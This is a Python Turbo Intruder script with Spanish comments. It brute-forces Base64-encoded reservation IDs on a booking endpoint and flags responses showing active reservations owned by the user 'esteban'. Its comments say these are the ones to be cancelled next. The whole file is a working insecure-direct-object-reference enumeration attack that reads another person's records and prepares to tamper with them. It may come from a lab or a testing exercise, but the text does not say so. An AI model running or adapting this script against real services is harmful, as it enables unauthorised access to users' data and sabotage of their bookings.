import base64

# Script de ENUMERACION (modo lectura, no cancela nada).
# Request base en Turbo Intruder:  GET /reserva/%s/?accion=leer HTTP/2
# El ID de reserva viaja Base64-encodeado en la URL, por eso codificamos
# cada entero antes de inyectarlo en %s.
#
# Filtro: marca las reservas ACTIVAS de esteban = titular "esteban" Y cuyo
# estado sea "pendiente" o "confirmada" (es decir, todo lo que NO este ya
# cancelado). Esas son las que hay que anular, sin re-tocar las ya canceladas.

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False)

    for i in range(204000, 206000):
        enc = base64.b64encode(str(i).encode()).decode()
        engine.queue(target.req, enc)


def handleResponse(req, interesting):
    body = req.response
    if body is None:
        return

    low = body.lower()

    # 1) Titular == esteban
    es_esteban = ('"username":"esteban"' in low or
                  '"username": "esteban"' in low)
    if not es_esteban:
        return

    # 2) Estado pendiente o confirmada (= activa, no cancelada)
    es_pendiente = ('"estado":"pendiente"' in low or
                    '"estado": "pendiente"' in low)
    es_confirmada = ('"estado":"confirmada"' in low or
                     '"estado": "confirmada"' in low)
    if not (es_pendiente or es_confirmada):
        return

    table.add(req)
